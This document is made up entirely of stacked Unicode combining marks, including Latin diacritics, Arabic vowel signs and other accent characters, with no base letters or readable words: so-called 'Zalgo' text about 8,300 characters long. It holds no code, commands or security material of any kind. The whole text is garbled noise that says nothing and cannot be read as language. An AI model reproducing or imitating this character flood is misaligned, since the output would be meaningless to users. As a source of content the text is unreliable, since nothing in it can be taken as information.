̵ًَّ̛̟͏̷ًٌٌٍٍَُُِِّّ̨͕̗̣͈͌ͣ̓̀͑̿͌̕͠҉̷̷̴̸̸̸̸̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّ̡̢̢̧̛̱͚̹͖̩͚̳̪̮̯͚̣̪̳̠̭̮͉̤̬̤̞͈̯͇̖͆ͥ̎͋̂̎̇͋̋̽ͥ̅̒͂̎̈́ͪ̏̆ͤ̾́͆̄ͪ́̚͘̕͜͟͠͞͏̸̶ًًٌٍَُِّ̣̼͚͚̖̲̜ͧ̾͘͟͡͝҉̵̴̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̧̢̢̧̨͔͎̹͎̮̬̹͚̞̣̼̘̪̘̬̻̯̼̅̆ͤ̒͋̄̍̌̊̂ͣ̒̌͊̔̇͌ͧͤ̑̕͢͟͟͡͡͠͞͝͏ٌُِ̢̜͋͘͏ٍّ̤̦͟҉ًًٌٌٍٍََُُِِّ̡̧̭̖͓͍̖̥̣̭ͮ̀̀̅͘̕͏̷̴̷ًًًٌٌٍٍَََُُِِّّّ̧͚͓͓͙̼̝̹̳͈̓̽ͥ̔ͥ͌͒ͩ̾͘̕͜҉ُ̰҉̶̴̴̸ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̡̢̨̡̨̛̛̪̩̖̳̥̦̮̝͓̞̮̖͍̟̲͙͇̞̠͖͈̫̳̋̋̀͗ͥ̂́̅̆̋́̆ͭ̿̐ͦ̔͂͋̄̄́ͪ̀̃͐ͫ̿̀̓͘̚͟͞͞͡͠͞͠͡ͅͅ҉̷ًٌٍٍَُِِّ̢̡̥͉̠͚̪̃͂̇̃͊̋̑͏̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧̢̨̡̨̛̜̬͔̯̹̬̟̼̱͂͊ͪ̀ͮ̏͘͘͝͝͞͏̴̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̨̧̛̜̳̖͖̬̫̼̣͉͎͉̭̤̹̝̏͌̔͒́̐́̍̈ͫͮͨͧͩͩͯ̐̕͜͜͟͡͠͝͞͡҉̴ًًٌٍٍََُِِّّ̛̛̱̝͎͉̬̬͉͎̮̎ͥ̀̋̋ͣ̒̌̕͘͟҉̷̶ًٌٌٍَُُِّ̡̣̜̤̳̓̎͗̌̀̚̕͞҉̶̵ًًًٌٌٍٍٍَََُُِِِّّّ̡̧̟͓͍̳̭̭̬̬̲̟͓̽͋́ͬ͆̍ͪ͆͋̄́͑̅ͫ͘҉̸̷ًٌٌٍٍَُُِِّّ͔̲̦͇̜̇ͦ̅͋̀̍ͬͣ͜͟͢͞͏̷̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̧̫̰̹͔̯̻̪͔̞̻̣̳̆̍̄̏ͯ̾̉̍́̊̆̃̕͜͢͡ͅ҉̴̶̴̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّ̢̡̢̡͍̖̞̠̬͔͔̠̠̩̝̤͇̙̳ͭͫͥ̀̈́̿͛͑̒́ͫͫ̈́ͮ̓̅̇̔̕͘͢͞͝͠͝͞͝͡͝͡͡ͅ҉̷̶ًٌَُِّ͓̣̪̑ͧ͂͛͏̷̵̸ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̧̛̛̳͉̹̟̱̼͔̟̹̟̫̫͈͙̭ͬ̑̍͛̈́́̋̈ͫ̔̌̓̀̊̃̎̑͗ͦ͘͜͞͡͏ًًٌٌٍَُُِّ̢̛̛̟̫̲̫͖̺̅̐ͅ͏ٍَِّ̧̫̀̀̽͏̷̷̵̴̴̷̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̧̡̧̧̡̛̺̯̼̝̻̱̰̞̜͈̥̩̣̱͍̟͉̪̫̥̝̼͚̼͉̺̖̬̼̟̞͔͔̰͒̀̔͌ͩ͒̐̄ͨ̔̀̀͗ͨ̓ͫ̓͑ͪ̀́͛͐ͦ̎̔ͭ̌͌̉̀͐́̈ͭ̕̚̕̕̚͘͢͟͢͢͞͠͡͠͞͡͡͠͡ͅ͏̵̵̵̸̵̷̸̵̸̸̷̶̴̸̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̧̢̧̢̡̨̡̡̧̛̪̦͙̦͓̟̺̹̝͔̘̹͕͉̯̺̞͇̜̞̖͈̮̩̥̙͍̠̟̬̫̫̟͇̥ͯ̄͋͛ͭͫ͌͒ͨͤ̓̂̋̇̿̌ͭͧ̐́̑̎͌ͨ͌̽ͨ̽̒͛̒̀͂̆͘͘̚͘͘̕͢͠͠͞͡͠͠҉̶̶̸̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̨̡̧̢̛̼̭͚̞̩͇̩̤͇̗̣̮͕̟̭̙̦̤͂̀ͦ̽͂́͆̆͐ͩ̃́̂̾͒̃͊͘̕͟͢͠͝͞͠҉̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̧̨̛͇͉̠͉͈̙̼̙͂̾̌̆̈͘͠͞͞͝҉ٍِ͈ͧ҉̸̸̷̴̷ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̛̳̲͍͓̮̝̣̺͇͍͍͓̗͂͌͑ͪͮ̓̔̇̆̏̚̕̕͢͡͞͠͏ًًٌٍٍََُُِِّّ̢͚̤͔̳̙̲̹ͤ̆ͣ́̉̾͢͢҉̴ًٌٍَِّ̱͇̭̓͝͏̴̸̶̶̶̵̶̵ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̧̨̛̛͓͈̺̞̳̺͎̤̤̞̪͈͙̪̖̙̹͕͚̫̙̮̩̮̯̻̮̼̙̞̺͙̐̍͆ͥ͆͆̂͐͆̅ͤͫ̿͐̂ͬ͐̍͌̓͊̾̒̇̀ͫ̀ͣ̏͘͘͘̕̚͟͟͠͡͠͝͞͞ͅͅ͏̷̷ًًًٌٌٌٍٍٍََُُُِِِّّ̧̧̢͈͚͚̪̬̞̬͕͖̋̽ͮͯ̓͛̌ͤ̄ͥ́ͧͥ͟͠͠͏̴̸ًٌٍََُِّّ̨͔̹̘͒̀͂̽͜ͅ҉ًٌُ̤ͧ҉̵̷̵̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̛̳̦̥̙̼̳͚̪̩̯̮̐̔́͊̅ͤͪ̊̄͆̚͘͠͠͠͝͝͏̶̸̶̸̸̵ًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̡̧̤͉̹͎̠̳͔̰̘̘̞̤̪̝ͭ̓ͦ̉ͩ̾̇̑͆ͧͪ́̍ͥ̏̎ͮ͂̕͢͢͡͠͞͏ًًٌٍَُُِّ̨̡̧̣͓̝̣̙̑̄̎̍ͣ̆̐ͧ͠͏ًٌٌٍٍَُِِّ͇̟̖ͮ͒̍͋͟͜͢͞͏̸̵̷̴ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̡̨̧̡͇̖̦̬̤̳̭̣͓͖̱͇̅̆̈́ͥͨ̈ͧ̃̈́ͬ͌̊̉̔́͆ͮͬ̐̔̅̕̕͟͢͜͡͠͝͞͝͝͞͞͏̶ٌٍَُِّ̨̰͈͓̖̭̾ͬͥ̓͝҉ًُ̹̹̀͞͏ٌٍِ̧̹̫ͯ͝҉̶̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̡̢̡̛̤̻̳͍̯͓̮̣̬̒̋͆͗̌̌ͧ̊̂͗̑̈́̏ͦ̕̚͟͜͡͞͏̴ًَ͏ٌُ̯ͩ͜͏̴̶̶̴ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̧̡̡̛̗̜͚͈̖͍̟͚̝͖͕̣̳̲͙͖͋ͪͥͦ̄ͬ͆ͦͪͯ̂̋̓̀͘͜͟͠҉̶̶̶̸̴̶̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̢̧̮̞͍͓̳͔̜̥̜̪̩̯̼̣̭̻̼̤͚̹̙͔̗͚̱͉̦̤̻̒͊̀͆̄́́ͨͭͧ̉ͧ̋̓́ͥ̔ͮͣ̿̌̐͋ͩ̌́ͯ̑ͯ͘̕͘͜͟͝͞͡͝͠͞͝ͅ͏ًٌٌٍَُِِّ̥̳̥͎ͨͮ́ͮ̌͐̅͑̕ͅ҉̸ًٍَّ͎̬̿̓ͭ̕̚͝͏̵̶̷ًًٌٌٍٍََُُُِِّّ̦̝̼̝̪͙̟̦̭͉̌ͩ͗̌̈́̍̃͂̌̎̕̕̕͜͜ͅ͏̶̴̸̴̴̸̵̶̶̷̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̧̡̡̡̛̮̳͍̮͓̟̟̺̰̲̮͕̯͓̰̬͔̜͚̲͙̜ͮ̅ͯ͆̒̍ͨͦ͗̐̂̏ͥ̉ͯ͛̆̉͋̈́ͧ̌͂̓ͮ̎̄̒̽ͧͦ́ͮͧͭ͘̚͘͘̚̕͢͞͞͞͡͠͝͞҉̴̷̷̴̵̷̴̶̷̴̸̴̸ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̢̧̡̢̨̛̛̛̛̖̠̰̬̞̯͖̦͈͙̰̰͚̠̬̫̮̠̙̤̳͖͚̰̳͚̱̙̯̠̖͈̩͎͇̬̹̟̰̩͔̲͍̮̬̱̟̣̻͚ͯ̂ͮ͋̒̔͒̔́̐̑̋̈̃̾̀̂́̓́̓͂ͦ̃̌̂ͮ̏̈̽̈́̓͌̾͆̐͌ͤ͌̓̌͂́̿ͫ́̿̈́͌͘̕̕̕̕̚͘͘̚͢͢͜͡͡͠͠͝͠͠͝͞͞͡͞͏̴̴̶̵̶̵̷̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّّ̡̢̨̨̡̢͔̲̙͎̠͖͍̰̟̼̺̥̰̻̜̲̣͕͍̜̳̭̮̼̰͓͚̪͕̲̗̰̰̗͚ͣ͑̇̏́̎̽ͭ̓̎ͯͣ̆̈́̂ͦ͂́͑̆͂̀ͨ́ͦ̒́̓̀ͪ͐͛̿̿͂ͬ̌́̇̓ͬͧ̅͂̚̕̕͘͟͢͜͢͟͞͞͠͡͞͡͞͡͠͡ͅͅ͏ًͤ͏̴̸̸ًًٌٌٌٍٍٍََُُُِِِّّّ̢̧̛̤͉̣͚̥̗͍̦̰ͬ̇ͩ̑̔͊̇̀ͨ̕͘͜͜͠͏̷ًًٌٌٍََُُِِّ̲̥͇͓͇̤͑ͤ͐̉ͧͬ̕͜͡͡҉̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̨̨̛̙̖͉̫̫̯̬̼̙̽ͩ̓͗̀̇ͫ̓̏͊́͋̇́̔̉̆͘͘͢͜͞͞͞͞͠ͅ҉̸̸̵̷̴ًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̮̼͔̖͚̦̻͖͖͚̥͉̫͓̗͛̅̈ͮͤͯͮ̈̔͘̕͢͟͠͠ͅ҉ًًًٌٌٌٍٍََُُُِِِّّ̧̛̝͔͓̟̗̗͗̌̆̓ͧ͑̐̂͗̕̕̕͟͢͝͏ٍَّ̙̌͏̴̴̵̴̷̴ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̨̨̨̡̛͈̝͔̟̫̣͎̗̫̰̮̳͍̞͍̗̩̥͇̠̾ͩͧ̑ͨ̅ͣ̓̓ͧ̓ͮ́̑͌̌́ͧ̓ͬ͘͘͜͢͢͠ͅ͏̴ًٌٍَُُِّ̪̮̮͙̫ͩ̔ͭͦ́͞͏̶̶̸̶̴̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِِّّّّّّّ̧̢̡̢̢̨̡̢̨̛̟͕̘̮̮̭̳͖͚̪̘̼̹̣͕͇̝̪͙̙̝̞̪ͫ̇́ͫ̿ͤ͛͗ͨ̆̃ͭ̍́̀ͤͯ̿ͦ̿̈̿͆́͘͘̚͘͘͜͢͜͠͡ͅͅ͏̸̶̶ًًٌٌٍٍٍَََُُِِّّّ̨̱̤̳̎̍͒ͣͭ̔ͯ̽̊͒́̇͝͞͞͡ͅͅ҉ً҉̵̷̴̴̷̵̷̶̸̷̷̶̷̶̴̶ًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̨̧̢̧̨̢̨̢̢̨̨̨̡̢̛̹̝̻͉͙̲͉̥͔̝͖͎̣͔̳̰̖̲̻̹͖̞̱͓̰̥̠̰̗̳̪̦͇̦͕̝̺̝̺̥͔̱͎̣͍̝̻̥̲̞͚̫̠͐̉̊ͩͥ͊́̅ͤ̀ͣ̊̑ͫ̐̇̒́͒̎͗̿̀͆̔ͫ͋ͮ̿͛͆̾͊̏ͤ͆̂̀̾ͯͨ͋͑͑̂ͩ̍ͨ̑̽ͨ̀ͥ̈́͘͘͘͢͜͜͟͢͢͟͢͝͝͠͠͞͞ͅ͏ًٌُ̢͎̂͏̴̴̴̵̷̷̶̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̢̧̧̢̨̧̨̨̨̡̛̛̟͎̥͈͓̻̲̜̩͈͙̯̤̥̖̳̫̗̗͓͔̮̦͙̹̥͍̱̮͖̫̞̘̜̠͎̲͎̯̬͇͔̍͌͆̃̀ͨ̍ͨ͐͗ͣ̽ͩͣͭ̇̀̓͋́̇ͬ̎̋ͪ͊̎́́̓͐̑́̐͒̋́̑ͧ̕͘͘͘̕͢͟͡͞͠͏ًٌٍَُِّ̤̖͋͑̕͢͝͏ًَُّ̙̇́͢͢͏ٌٍَِّ̢̜̜̈́͌͘͝҉̵̵ًًٌٌٍٍَُُِِّ͔̤̻̝̻̭͈̪̪̠ͨͬ̾̀̂ͧ̒͒̃͞͠͏̵̷ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̨̲͎̭̝͇̮̪̥̻̯̺͒̏ͬ́ͨ̀̉̾̀ͯ̕̕̚͟͟͜͠͞͠͞ͅ҉̴̵ًًٌٌٍَُُِِّ̨̲͕̘̙͖͊̀̒̚͞҉̸̷ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̢̛̻̤͇̯̭͉̫̜̜͓̰̮̱͎͑ͬ̑͌͋ͫ͌͗ͨ̀ͫ̿̇̅͘͜͜͜͜͏̴̴̸̸̷̵̸̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̡̢̛̩͇̻̩̤̥̝̩͚̟̦̝͓͕̼̜̠͛̉ͯͣ̀̋ͭͬ͛̓͆ͩ́̈͑̉̎̒̀̽͊ͭͩ́̕͘͝͞͝͞͡҉̷̶̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̛̮̟̤̦̰͎̟͍̮͔̠̫̘̗̿̐́̄ͮ̊ͥ̋͋ͬͬͣ̿͌̊̕̕͢͢͠͝͠҉̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̡̢̧̢̪̤̙͎͍̦̥̖̱̥̣ͪ̐ͤ͒̇͗͊͑ͨͧ̅̕̚̕͜͞͠͝͏ٍِّ̛̟ͩ͏ًًٌٍََُُِّ̧͉͈̳̖̟̠̥ͬ̄́̈́͛̀͌͘͏̵̷̶̷̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̨̧̧̢̨̡̧̛̖͔̺͚̫̠̪͎̼͚̯̬̤̺̤̻̞̦͈̬̜̞̻̬̪͕̲̙̘͔̳̲̟ͦ͌ͯ́́͌ͣ̑ͨͦ̇ͤͧ͗̆͗ͯͮͪͮ̄͗̏̃ͭ̍ͣ͗̾͂͋ͩ̕̚̕̕̕͘͟͜͢͝͝͡͞ͅ҉̶ًٌٌٍٍَُِِّّ̧̻̜̗̙͍̗͊̏̉͒̄͌͞͝͏̶̷ًًٌٍََُِّ̙̳̳̅́ͩͮ̎͡͝҉̵̶̸̷̴̴̶ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̧̨̢̧̛͍̘͕͓̰͈̦̝̞̻̗̦̝͔̩͇̺͕̃ͮ́̈́̋̾͊̊͒́̀̏̈́̊̍̿̿͛͒͜͜͟͢͡͡҉̵̴ًًًٌٌٌٍٍَََُُُِِِّّّ̧̧̛̯̺͇͙͇̳͖̯̭̲͓ͥ̀̓ͮ̓͂̑ͥ͐ͩ̑͠͠҉̸̶̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِّّّّّ̡̧̧̧̛̲̙͓̝͚̫̗̩̞̪̱̜̱̜̟̯͓͂ͫ͊̐̅̎̂̂̾̉̾ͣ̑͛̐̽ͣͦ̀͘̕͘̕̕͜͢͠҉̷ًًٌٌٍٍََُُِِّّ̡̧̛̎̒ͮ̆ͥ̚͞͞͏̷̴̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̧̧̨̨̢͈͓̖̥̣͚̹͙̝̠͎̭͈͕͙̟̻̼̳͕̖̤̙̲̈́̒͗͗̈́͒͆̍̃́̀̉͂̊́̈́̃ͩ̀̈́ͦ͘̕̕͜͢͞͝͞͏̸̷̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̢̨͚͚͖͙͚̗̖̞̘͉̮͎̯̱̙͖̇̒ͯ́ͦ́̽͐͑̔̽̓ͥ̒͒̄ͪ̌̕̚͘͢͜͢͞͝͠͞͝ͅ҉̴̶̷̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̢̡̤̼̦̙̳̭̱̹̙̿̀̀̃̆ͪͦͬ̑͒͟͝҉̸ًًٌٌٍٍٍََُُِِِّّ̧̨̧̛̛̦̙̭̠̱̹̯̻̔̃͑͑ͫ̔ͨ̇͟͢͞҉̵ًًٌٌٍٍََُُِِّّ̜͓̥̱͎̳ͪ́́̀ͩ̀ͫ́̽͟҉̵̵̶̸̷̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̢̧̢̛̙̲͓̘̯̠̬̤̯̠̭̳̪̹͔͈̩̹̮̙͇̇ͤ̋̋ͥ̋͛ͤ̒̀̉̽ͭ͌̋ͯ̄ͭ͋͢͢͜͢͞͞͠҉̸̶̵̷ًًًٌٌٌٍٍٍَََُُِِِّّّ̡̛̛̼̦̳̞͎͐̂̈͊̃ͣ̎͜͢͞͠͏̴ٌُ̻̑҉̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̨̡̣̭͙̝͔͍̭͎͇͎͓͓̫̯̤̘͈̯̹̥̱͛̓̐̀̓ͣ̐̈́̂̇͆̒ͩͥ̉͌̃̒͑̀̒̊̆͂̕͘͘͢͟͜͜͜͡͠͞͞͠͡͝҉ًًٌٌٍٍََُُِِّّ̧͖̱͍̙̥͍͕̠̺͎̤̒̆ͥͫ̀̒͛ͪ͂́̏̌͟ͅ҉̷ًٌٍَُِّ̧̗̻̺̰̻͂̈̂̔͢͝҉̵ًًٌٍََُِّ̨͖̬̻̱̊̀̀͟͡҉̸̸̵̸̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̡̢̛̠̙͎̩̗̪̦͎̠̦̟͕̘̲͍̪͇͈͇̾̋͗̂͆̽́̃̃̈ͥ́ͩ̑̌̈ͧͨ́̋̕̕͘͘͘͜͢͞͠͏̸ًٌٍَُِِّ̢̛̬͎̠̈̀ͭ͐͠͏̸̶ًٌٍٍَُِّّ̱̱̩̣̼͓̦̐̆ͣ̕͟͝͏ًَُ̺̗ͬ͏̴̸̸̴̴̷ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̢̧̧̡̛̛̜̝̤̻͔͎͔̖͕̗̠̤͓͓͈̱̣͓̝̩͎̫̺̰̘̣͇̄̐ͨ͌̃̇͆̎ͭ̽͌ͤ͗̃̒ͫ̏̒̂͌͋̏́̓̍ͧ̚̕͘̚͢͢͜͢͟͡͞͝͞͞͏̸̶̷̴̷̷̴̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̧̨̛̫̱͎̭͖̻̝̯͈̖̼̣̼̙͎̬̤͎̖̺͉̯͌̀̑ͩͮ̑̏̈̑ͫ̇̇ͫͧ̀̋ͯͦͧ̄͌ͫ͌̉̑̽͋̄̐͑͘̚͘͘͘͘͢͢͡͠͝͏̴̴̶̶̷̷̴̴ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̡̢̡̧̭̙̞̣̠͖͍̰͖͈͍͎̣̪̦ͩ̄̌̔͂͊̈́͋̽̏̿̆͊̈̾̅ͪ̕͘͘͟͟͠͠҉ًٌٌٍٍَُُِِّ̨̟̰̼̳ͧ̈́̀ͯ̇̓̊ͣ̈́̄͢͟͢͏ًًٌٍََُِّّ̪͓̝ͦͬͪ͂̕͞ͅ҉̵̶̴̵̸̸̷̷̶ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̢̡̧̢̢̧̧̢̺̥̰̱̗̤̩̰͙̗͔̲̘̦͚̦͓̼̞͈̟̤̍́̽ͨ̌̈͛ͥͥ̂ͭͭ͗͌̅͋̀͋ͪͩ̏̾ͭ̍̌͒͋ͩ̍̋ͣ̍̉ͧͭ̕͜͟͟͟͝͠͞͡͞ͅͅͅ҉َّͭ͏̵̴̸̶̶̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̡̢̡̨̡̜̻̼̺̩͖̠̠̖̺̼̜͎̤͕̩͖̦̫͕͕̬̖͐ͦ̎̍ͤ͋͛̊̆̓̈́̋̋ͩͭͥ̉́̉̓ͤ̅̑̑̉͐̾́̎̃͒͗͘͘͢͟͟͡͝͝҉̴̵ًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̡̢̡̨̡̲͚͖̗̺̺̘̞͕̲̺͎̠ͥ̓ͫ̐́͐́̅ͣͩ̈́ͬ̒̀̈́͢͜͠҉ًٌٍَُِّ͉̬͖́ͩ͝҉̶ًٌٍُِّ̢̗̾̊҉̸̶ًًًٌٌٌٍٍَََُُُِِِّّ̧̡̨̼̥̗̙̼̱͈̻͓ͤͨͩ͆ͯͭͯͩ̀̓ͮ͑͘͜͜͢͟͞ͅ͏ٍ̟̎҉ّ͍҉̷̵ًًًٌٌٌٍٍَََُُُِِّّ̧̧̛̛͉͎̲͔̗͎͉̙̙͔̞̏͗̽́̆͒̚̚͘͡͠҉̷̵̵̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̢̢̧̡̧̛͍̹͙̘̳̟͉̖̗̭̪͓͖͔͖͕̭͈̹̬͍̦̦͍̥̦̰̪̳͇͍͖̓̀̅ͭ̌ͣ̏́ͬ̋̏̓̎ͤ̀̈́͗ͭ̽ͨͤ̂̉̾́̾̈́̐̆ͨ̏͒̉̍̎̑ͯ̀͘͘̚̚͜͜͜͢͟͜͠͝͡͡͠͡͏ًًٌٌٍٍٍََُُِِِّّّ̡̮̻͖̥̠̙͍̫͕͉̾ͧ͌ͯ̿́ͫ̅̃̓̔͢͢͝͠͏̵ًًًٌٌٌٍٍَََُُُِِّّ̢̳͕̞̜̳̮̺͊ͫ̿̂ͯͤ̽ͧ͘͜͜͞͡͏̷̸ًًٌٍٍََُِِّّ̡̺͕̳̥̻̒ͪ̃̓ͪ̾̊͘͟͢͏̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̢̢̢̧̨̛͚̠͍͉̼̗̼̘̥̘̳͚̣̘̠̣̥̺͍̥̥̝̝̦̣̱̬̿̀̋̄͂ͫͨ͆̈́͗̌ͩ̋̓ͤ͗ͮ̔ͦͨ͊̂̄̋̊̋͛͑̾ͫ́ͬ͋̀̇͘͘̕̕̚͟͢͟͟͞͞͠͠͠͠͝͡͞҉ً҉ًًٌٌٍٍََُُِِّّ̻̮̝̬̥̉̃ͬ̃́͠͠҉ٌٍَُِّ̧̰͚̱̫̫̃͝͏̶ًٌُ̣̤̆҉̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̨̱̥̱͍̪̮̘̣̜̙̖̗͈̪̠̤͑ͬ̓͐ͣ̉ͩͩ͗ͭ̉ͦ̋ͨ̔̾͆̕͘͢͟͜͞͞͝͡͞҉̵̶̷̷̸̶̴̸ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̡̡̨̡̡̧̛̛̥͎̘̠̟͇̘͇̝̥͖̤̩̲̼̮̰͕̲͕̲͖̲̰̝̠̥̳̮̋̂̃̈͐͑̑ͬͥ͂̍̈̀ͨͥͭ̽ͤ̃́̄̄̐ͧ̀̽ͮ͊̚̕̕͜͢͝͠͞͡͞͝ͅͅͅ҉̷̴̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̡̨̨̟̥͚̯̜̻͙̰̘ͪ͂̽̐ͨͪ̋ͣͧ̀͗́ͭ͜͢͠҉̶̴̴̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̧̨̧̡̛̛̛͖͉̲͍̙̭̦̠͓͓̠̬͚̩̫͖̥̣̙͇̩̙̭̩͖͛͋̏̂̅͗͌ͮ̀͛̄̒̒ͭ̋̈́̇ͣͣ͘̕̕͢͢͟͜͞͞͠͡͞͏̸̷̵̷ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̡̧̡̛̲̠͕̲̰̘̲̥͔̳̟̳̭̲̜̱͋͒̔̐ͨ̿ͫ́̓͆ͧͭ́ͣͭ̊ͣ̄̕͟͟͝͝͡͝҉̴̴ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̡̧̡̡̛̱̱͔̯̖̳̘̘̯̹̥̝̝͛ͭ̆̂̀ͨ̄͐ͩ̇͊͌͌ͣ̍ͯ̀͘̕͟͢͜͠͠ͅ҉ًًٌٌٍٍََُُِِّ̙̝̤̘͓̥̳̆͋ͨ̃ͣ̑͘͘͢͝͏̷ًًٌٍََُُِّّ̡̮ͪ̏̓̐̉͟͠͏̵̴̴̵ًًٌٌٌٍٍٍََُُِِِّّّ̢̢̝͓͔̜̭̝͍̞̪̣ͪͪ̅̔̐͌̈́̆ͫ̌̎͠͏̸̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̧̢̢̘̳̮̙͙̳͚̺̺͖̹̬̘̘̦̖̖̩̟͔͖̰͐ͤ́̔̇̏̅ͤ͆̀̑́͋̈ͦͨ̈́̌ͩͨ̀̈̑͛̄̚̕̕͟͢͜͟͢͞͡͠͡҉̶ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̨̧̛̛̣̥̟̟̩̮̖̘̞̮͔̞͖͕̖̹̯̻̖͂̉͆̓͊̓ͧ́ͫͩ̂́͗͑͐ͧ͌̅̀̔͆̒ͤ̚̕͢͢͡͝͠ͅ҉̶̵̷ًًًٌٌٌٌٍٍٍَََُُُِِِِّّّ̨̧̛̘̭̙̺̥͙̺͎̼̪ͨͫͯ̀ͬ̓ͭ̄ͪͪͬ̚͜͞͠͞҉̶̵̷̴̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّ̡̡̮͕̩̣̬̘̟͉͖̺͓̺̙̼̝̜͉̀̉̄͂̿̒ͫ̉̽ͩ͊͑ͥͩ̽͘̚̚̕͞͠҉ًَُّ̡̤̑̀͏ًٌٍَِّ̛̣̱̮́͆́̔͏ٌُ̃ͧ͘͝